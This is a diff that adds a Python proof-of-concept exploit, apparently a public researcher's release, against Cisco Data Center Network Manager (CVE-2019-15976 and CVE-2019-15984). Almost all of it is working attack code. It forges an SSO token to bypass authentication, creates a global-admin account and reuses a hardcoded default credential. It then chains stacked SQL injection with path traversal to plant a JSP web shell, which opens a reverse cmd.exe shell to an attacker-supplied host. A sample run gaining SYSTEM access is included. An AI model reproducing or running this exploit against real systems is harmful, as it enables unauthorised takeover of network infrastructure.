@@ -1,0 +1,323 @@
+#!/usr/bin/python
+"""
+Cisco Data Center Network Manager HostEnclHandler getVmHostData SQL Injection Remote Code Execution Vulnerability
+
+Tested on: Cisco DCNM 11.2.1 Installer for Windows (64-bit)
+- Release: 11.2(1)
+- Release Date: 18-Jun-2019
+- FileName: dcnm-installer-x64-windows.11.2.1.exe.zip
+- Size: 1619.36 MB (1698022100 bytes)
+- MD5 Checksum: e50f8a6b2b3b014ec022fe40fabcb6d5 
+
+Bug 1: CVE-2019-15976 / ZDI-20-008
+Bug 2: CVE-2019-15984 / ZDI-20-060
+
+Example:
+========
+
+saturn:~ mr_me$ ./poc.py 
+(+) usage: ./poc.py <target> <connectback>
+(+) eg: ./poc.py 192.168.100.122 192.168.100.59:1337
+
+saturn:~ mr_me$ ./poc.py 192.168.100.122 192.168.100.59:1337
+(+) created the account hacker:Hacked123
+(+) created the 1337/custom path!
+(+) leaked vfs! temp230cf31722794196/content-ed98b5003b1c695c
+(+) SQL Injection working!
+(+) wrote the si.jsp shell!
+(+) cleaned up the database!
+(+) starting handler on port 1337
+(+) connection from 192.168.100.122
+(+) pop thy shell!
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>whoami
+whoami
+nt authority\system
+
+C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>
+
+Clean Up:
+=========
+
+1. delete from xmlDocs where user_name = '1337';
+2. delete si.jsp from the web root
+3. delete the folder and its contents: C:/Program Files/Cisco Systems/dcm/fm/reports/1337
+"""
+
+import re
+import md5
+import sys
+import time
+import socket
+import base64
+import requests
+import telnetlib
+from threading import Thread
+from xml.etree import ElementTree
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def _get_jsp(cbh, cbp):
+    """ get me some jsp for a connectback! """
+    jsp = """
+    <%%@page import="java.lang.*"%%>
+    <%%@page import="java.util.*"%%>
+    <%%@page import="java.io.*"%%>
+    <%%@page import="java.net.*"%%>
+
+    <%%
+      // clean up
+      String[] files = {
+          "C:/Program Files/Cisco Systems/dcm/fm/reports/1337/custom/si.xml", 
+          "C:/Program Files/Cisco Systems/dcm/fm/reports/1337/custom/",
+          "C:/Program Files/Cisco Systems/dcm/fm/reports/1337/",
+      };
+      for (String s:files){ File f = new File(s); f.delete(); }
+      File f = new File(application.getRealPath("/" + this.getClass().getSimpleName().replaceFirst("_",".")));
+      f.delete();
+      class StreamConnector extends Thread
+      {
+        InputStream we;
+        OutputStream uo;
+
+        StreamConnector( InputStream we, OutputStream uo )
+        {
+          this.we = we;
+          this.uo = uo;
+        }
+
+        public void run()
+        {
+          BufferedReader dy  = null;
+          BufferedWriter zvi = null;
+          try
+          {
+            dy  = new BufferedReader( new InputStreamReader( this.we ) );
+            zvi = new BufferedWriter( new OutputStreamWriter( this.uo ) );
+            char buffer[] = new char[8192];
+            int length;
+            while( ( length = dy.read( buffer, 0, buffer.length ) ) > 0 )
+            {
+              zvi.write( buffer, 0, length );
+              zvi.flush();
+            }
+          } catch( Exception e ){}
+          try
+          {
+            if( dy != null )
+              dy.close();
+            if( zvi != null )
+              zvi.close();
+          } catch( Exception e ){}
+        }
+      }
+
+      try
+      {
+        String ShellPath;
+        ShellPath = new String("cmd.exe");
+        Socket socket = new Socket( "%s", %s);
+        Process process = Runtime.getRuntime().exec( ShellPath );
+        ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+        ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+      } catch( Exception e ) {}
+    %%>
+    """ % (cbh, cbp)
+    return jsp
+
+def get_session(target, user, password):
+    """ we have bypassed auth at this point and created an admin """
+    d = {
+        "j_username" : user,
+        "j_password" : password
+    }
+    uri = "https://%s/j_spring_security_check" % target
+    r = requests.post(uri, data=d, verify=False, allow_redirects=False)
+    if "Set-Cookie" in r.headers:
+        match = re.search(r"JSESSIONID=(.{56}).*resttoken=(\d{1,4}:.{44});", r.headers["Set-Cookie"])
+        if match:
+            sessionid = match.group(1)
+            resttoken = match.group(2)
+            return { "JSESSIONID" : sessionid, "resttoken": resttoken}
+    return False
+
+def craft_soap_header():
+    soap_header  = '\t<SOAP-ENV:Header xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
+    soap_header += '<m:ssoToken xmlns:m="http://ep.jaxws.dcbu.cisco.com/">%s</m:ssoToken>' % gen_ssotoken()
+    soap_header += '\t</SOAP-ENV:Header>'
+    return soap_header
+
+def we_can_trigger_folder_path_creation(target):
+    """ craft the path location and db entry for the traversal """
+    soap_body  = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">'
+    soap_body += craft_soap_header()
+    soap_body += '\t<soapenv:Body>'
+    soap_body += '\t\t<ep:saveReportTemplate>'
+    soap_body += '\t\t\t<reportTemplateName>si</reportTemplateName>'
+    soap_body += '\t\t\t<userName>1337</userName>'
+    soap_body += '\t\t\t<updatedAttrs></updatedAttrs>'
+    soap_body += '\t\t\t<pmInterval>1337</pmInterval>'
+    soap_body += '\t\t</ep:saveReportTemplate>'
+    soap_body += '\t</soapenv:Body>'
+    soap_body += '</soapenv:Envelope>'
+    uri = "https://%s/ReportWSService/ReportWS" % target
+    r = requests.post(uri, data=soap_body, verify=False)
+    if r.status_code == 200:
+        return True
+    return False
+
+def we_can_trigger_second_order_write(target, shellpath):
+    """ trigger the traversal """
+    soap_body  = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">'
+    soap_body += craft_soap_header()
+    soap_body += '\t<soapenv:Body>'
+    soap_body += '\t\t<ep:openReportTemplate>'
+    soap_body += '\t\t\t<reportTemplateName>%s</reportTemplateName>' % shellpath
+    soap_body += '\t\t\t<userName>1337</userName>'
+    soap_body += '\t\t</ep:openReportTemplate>'
+    soap_body += '\t</soapenv:Body>'
+    soap_body += '</soapenv:Envelope>'
+    uri = "https://%s/ReportWSService/ReportWS" % target
+    r = requests.post(uri, data=soap_body, verify=False)
+    if r.status_code == 200:
+        return True
+    return False
+
+def gen_ssotoken():
+    """ auth bypass """
+    timestamp = 9999999999999  # we live forever
+    username = "hax"           # doesnt even need to exist!
+    sessionid = 1337           # doesnt even need to exist!
+    d = "%s%d%dPOsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF" % (username, sessionid, timestamp)
+    return "%d.%d.%s.%s" % (sessionid, timestamp, base64.b64encode(md5.new(d).digest()), username)
+
+def we_can_trigger_sql_injection(target, sql):
+    """ stacked sqli primitive """
+    sqli = ";%s--" % sql
+    soap_body  = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">'
+    soap_body += craft_soap_header()
+    soap_body += '\t<soapenv:Body>'
+    soap_body += '\t\t<ep:getVmHostData>'
+    soap_body += '\t\t\t<arg0>'
+    soap_body += '\t\t\t\t<sortField>vcluster</sortField>'
+    soap_body += '\t\t\t\t<sortType>%s</sortType>' % sqli
+    soap_body += '\t\t\t</arg0>'
+    soap_body += '\t\t\t<arg1></arg1>'
+    soap_body += '\t\t\t<arg2></arg2>'
+    soap_body += '\t\t\t<arg3>false</arg3>'
+    soap_body += '\t\t</ep:getVmHostData>'
+    soap_body += '\t</soapenv:Body>'
+    soap_body += '</soapenv:Envelope>'
+    uri = "https://%s/DbInventoryWSService/DbInventoryWS" % target
+    r = requests.post(uri, data=soap_body, verify=False)
+    if r.status_code == 200:
+        return True
+    return False
+
+def we_can_leak_vfs(target):
+    """ we use a information disclosure for the vfs path """
+    global vfs
+    uri = 'https://%s/serverinfo/HtmlAdaptor?action=displayServerInfos' % target
+    c = requests.auth.HTTPBasicAuth('admin', 'nbv_12345')
+    r = requests.get(uri, verify=False, auth=c)
+    match = re.search(r"temp\\(.{21}content-.{15,16})", r.text)
+    if match:
+        vfs = str(match.group(1).replace("\\","/"))
+        return True
+    return False
+
+def handler(lp):
+    """ this is the client handler, to catch the connectback """
+    print "(+) starting handler on port %d" % lp
+    t = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lp))
+    s.listen(1)
+    conn, addr = s.accept()
+    print  "(+) connection from %s" % addr[0]
+    t.sock = conn
+    print "(+) pop thy shell!"
+    t.interact()
+
+def exec_code(t, usr, pwd, cbp):
+    """ this function threads the client handler and sends off the attacking payload """
+    handlerthr = Thread(target=handler, args=(int(cbp),))
+    handlerthr.start()
+    r = requests.get("https://%s/si.jsp" % t, cookies=get_session(t, usr, pwd), verify=False)
+
+def we_can_add_user(target, usr, pwd):
+    """ add a user so that we can reach our backdoor! """
+    soap_body  = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">'
+    soap_body += craft_soap_header()
+    soap_body += '\t<soapenv:Body>'
+    soap_body += '\t\t<ep:addUser>'
+    soap_body += '\t\t\t<userName>%s</userName>' % usr
+    soap_body += '\t\t\t<password>%s</password>' % pwd
+    soap_body += '\t\t\t<roleName>global-admin</roleName>'
+    soap_body += '\t\t\t<enablePwdExpiration>false</enablePwdExpiration>'
+    soap_body += '\t\t</ep:addUser>'
+    soap_body += '\t</soapenv:Body>'
+    soap_body += '</soapenv:Envelope>'
+    uri = "https://%s/DbAdminWSService/DbAdminWS" % target
+    r = requests.post(uri, data=soap_body, verify=False)
+    tree = ElementTree.fromstring(r.content)
+    for elem in tree.iter():
+        if elem.tag == "resultMessage":
+            res = elem.text
+    if res == "Success":
+        return True
+    elif res == "User already exists.":
+        return True
+    return False
+
+def main():
+
+    usr = "hacker"
+    pwd = "Hacked123"
+
+    if len(sys.argv) != 3:
+        print "(+) usage: %s <target> <connectback>" % sys.argv[0]
+        print "(+) eg: %s 192.168.100.122 192.168.100.59:1337" % sys.argv[0]
+        sys.exit(1)
+
+    t = sys.argv[1]
+    c = sys.argv[2]
+
+    cbh = c.split(":")[0]
+    cbp = c.split(":")[1]
+    sc = _get_jsp(cbh, cbp).encode("hex")
+
+    # stage 1 - add a user
+    if we_can_add_user(t, usr, pwd):
+        print "(+) created the account %s:%s" % (usr, pwd)
+
+        # stage 2 - trigger folder creation and db entry
+        if we_can_trigger_folder_path_creation(t):
+            print "(+) created the 1337/custom path!"
+
+            # stage 3 - leak the vfs path (not really required I suppose)
+            if we_can_leak_vfs(t):
+                print "(+) leaked vfs! %s" % vfs
+
+                # stage 4 - trigger the sql injection to update our template entry
+                sp = "../../../../wildfly-10.1.0.Final/standalone/tmp/vfs/temp/%s/si.jsp" % vfs
+                sql = "update xmldocs set document_name='%s',content=decode('%s','hex') where user_name='1337';" % (sp, sc)
+                if we_can_trigger_sql_injection(t, sql):
+                    print "(+) SQL Injection working!"
+
+                    # stage 5 - trigger the shell write
+                    if we_can_trigger_second_order_write(t, sp):
+                        print "(+) wrote the si.jsp shell!"
+
+                        # stage 6 - cleanup
+                        sql = "delete from xmldocs where user_name='1337';"
+                        if we_can_trigger_sql_injection(t, sql):
+                            print "(+) cleaned up the database!"
+
+                        # stage 7 - go get some rce
+                        exec_code(t, usr, pwd, cbp)
+
+if __name__ == "__main__":
+    main()
